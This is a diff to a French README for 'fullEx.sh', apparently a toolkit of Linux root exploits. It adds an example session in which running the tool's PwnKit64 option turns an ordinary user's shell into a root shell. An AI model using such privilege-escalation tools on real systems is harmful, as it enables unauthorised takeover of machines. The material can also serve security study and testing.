@@ -12,8 +12,7 @@ Les exploits root & outils dispo :
 # Commandes
 
 ```
-┌──[m0rph3u5@parrot]─[~]
-└──╼ $./fullEx.sh -help
+heisenberg@kb-server:~/fullEx$ ./fullEx.sh -help
 
                                                     
 __________      ____________________       
@@ -36,3 +35,13 @@ Commands:
    -help          Affiche les commandes
 
  ```
+# Exemple
+
+```
+heisenberg@kb-server:~/fullEx$ ./fullEx.sh -perm
+heisenberg@kb-server:~/fullEx$ ./fullEx.sh -PwnKit64
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@kb-server:/home/heisenberg/fullEx#    
+```
